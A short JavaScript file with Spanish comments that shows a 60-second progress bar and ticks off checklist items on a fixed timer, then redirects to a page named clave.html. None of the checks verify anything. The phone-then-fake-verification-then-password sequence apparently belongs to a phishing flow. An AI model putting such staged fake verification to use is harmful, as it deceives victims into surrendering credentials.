(() => {
  const TOTAL = 60; // segundos

  // Si no hay sesión válida, vuelve al inicio
  if (!sessionStorage.getItem('phone')) {
    window.location.replace('index.php');
    return;
  }

  const fill = document.getElementById('progressFill');
  const timeLeftEl = document.getElementById('timeLeft');
  const checks = document.querySelectorAll('#checkList li');
  const finalNote = document.getElementById('finalNote');

  // Distribución profesional: cada check se completa en distintos momentos
  // y con un pequeño delay aleatorio para que se sienta orgánico.
  const checkpoints = [
    { at: 18, idx: 0 },  // ~30%
    { at: 38, idx: 1 },  // ~63%
    { at: 56, idx: 2 },  // ~93%
  ];

  let elapsed = 0;
  const tick = () => {
    elapsed += 1;
    const remaining = Math.max(0, TOTAL - elapsed);
    const pct = (elapsed / TOTAL) * 100;
    fill.style.width = Math.min(100, pct) + '%';
    timeLeftEl.textContent = remaining + 's';

    checkpoints.forEach((cp) => {
      if (elapsed >= cp.at && !checks[cp.idx].classList.contains('done')) {
        checks[cp.idx].classList.add('done');
      }
    });

    if (elapsed >= TOTAL) {
      clearInterval(timer);
      checks.forEach((c) => c.classList.add('done'));
      window.location.href = 'clave.html';
    }
  };

  const timer = setInterval(tick, 1000);
})();
